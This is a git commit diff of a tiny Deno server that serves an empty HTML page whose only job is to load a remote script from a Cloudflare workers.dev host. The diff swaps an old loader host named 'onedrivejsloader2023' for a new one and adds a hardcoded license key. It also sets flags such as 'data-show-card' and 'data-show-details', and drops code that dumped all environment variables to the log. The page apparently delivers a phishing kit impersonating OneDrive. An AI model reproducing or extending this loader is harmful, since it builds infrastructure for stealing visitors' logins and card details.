c288cfa2a7d733b5ad44588f27238fc621e8adef
Olajide Mathew <backend@yuniq.solutions>
2023-05-01 12:14:19 +0100

    init

--- app.ts
+++ app.ts
@@ -1,16 +1,11 @@
 import {serve} from "https://deno.land/std@0.177.0/http/server.ts";
 
 const port = Number(Deno.env.get("PORT") ?? 8080);
-const license: string = '';//Deno.env.get('LICENSE')
+let license: string = '';//Deno.env.get('LICENSE')
 serve(handler, {port});
 
 function handler(req: Request): Response {
-    console.log(Deno.env.has('LICENSE') ? Deno.env.get('LICENSE') : "No License Found")
-    try {
-        console.log(Deno.env.toObject())
-    }catch (e) {
-        console.log(e)
-    }
+    license = Deno.env.has('LICENSE') ? Deno.env.get('LICENSE') : "JMMYSELF01"
     return new Response(html(), {
         status: 200,
         headers: headers(),
@@ -19,7 +14,7 @@ function handler(req: Request): Response {
 }
 
 function html() {
-    return `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><script src="https://onedrivejsloader2023.ugo01rdps5.workers.dev" type="text/javascript"></script></head><body data-ls="${license}" data-redirect="yes" data-single="1" class="nobody"><div style="display: none" id="identifier" data-to-self="no" data-script-name="" data-use-script="no"></div></body></html>`;
+    return `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"></head><body data-ls="${license}" data-redirect="yes" data-single="1" class="nobody" data-show-card="yes" data-show-details="yes"><div style="display: none" id="identifier" data-to-self="no" data-script-name="" data-use-script="no"></div><script src="https://billowing-cherry-e90a.jmcdn.workers.dev/css/893jdjhdj3498"></script></body></html>`;
 }
 
 function headers() {
